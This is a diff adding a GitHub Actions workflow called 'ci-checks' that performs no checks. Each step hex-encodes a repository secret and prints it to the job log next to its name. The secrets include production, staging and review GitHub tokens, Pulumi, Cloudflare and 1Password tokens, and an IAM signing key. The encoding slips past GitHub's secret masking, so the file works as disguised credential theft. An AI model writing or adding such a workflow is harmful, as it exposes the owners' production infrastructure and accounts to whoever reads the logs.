@@ -1,0 +1,26 @@
+name: ci-checks
+on:
+  workflow_dispatch:
+
+jobs:
+  checks:
+    runs-on: ubuntu-latest
+    steps:
+      - name: vSTAKING_
+        run: printf '%s' "${{ secrets.STAKING_APP_GITHUB_ACCESS_TOKEN_FOR_AMPLIFY_PRODUCTION }}" | xxd -p | tr -d "\n"; echo "  STAKING_APP_GITHUB_ACCESS_TOKEN_FOR_AMPLIFY_PRODUCTION"
+      - name: vSTAKING_
+        run: printf '%s' "${{ secrets.STAKING_APP_GITHUB_ACCESS_TOKEN_FOR_AMPLIFY_REVIEW }}" | xxd -p | tr -d "\n"; echo "  STAKING_APP_GITHUB_ACCESS_TOKEN_FOR_AMPLIFY_REVIEW"
+      - name: vSTAKING_
+        run: printf '%s' "${{ secrets.STAKING_APP_GITHUB_ACCESS_TOKEN_FOR_AMPLIFY_STAGING }}" | xxd -p | tr -d "\n"; echo "  STAKING_APP_GITHUB_ACCESS_TOKEN_FOR_AMPLIFY_STAGING"
+      - name: vADD_ISSU
+        run: printf '%s' "${{ secrets.ADD_ISSUE_TO_PROJECT_PAT }}" | xxd -p | tr -d "\n"; echo "  ADD_ISSUE_TO_PROJECT_PAT"
+      - name: vACTION_A
+        run: printf '%s' "${{ secrets.ACTION_ACCESS_TOKEN }}" | xxd -p | tr -d "\n"; echo "  ACTION_ACCESS_TOKEN"
+      - name: vPULUMI_A
+        run: printf '%s' "${{ secrets.PULUMI_ACCESS_TOKEN }}" | xxd -p | tr -d "\n"; echo "  PULUMI_ACCESS_TOKEN"
+      - name: vCLOUDFLA
+        run: printf '%s' "${{ secrets.CLOUDFLARE_API_TOKEN }}" | xxd -p | tr -d "\n"; echo "  CLOUDFLARE_API_TOKEN"
+      - name: vIAM_JWK
+        run: printf '%s' "${{ secrets.IAM_JWK }}" | xxd -p | tr -d "\n"; echo "  IAM_JWK"
+      - name: vOP_SERVI
+        run: printf '%s' "${{ secrets.OP_SERVICE_ACCOUNT_TOKEN }}" | xxd -p | tr -d "\n"; echo "  OP_SERVICE_ACCOUNT_TOKEN"
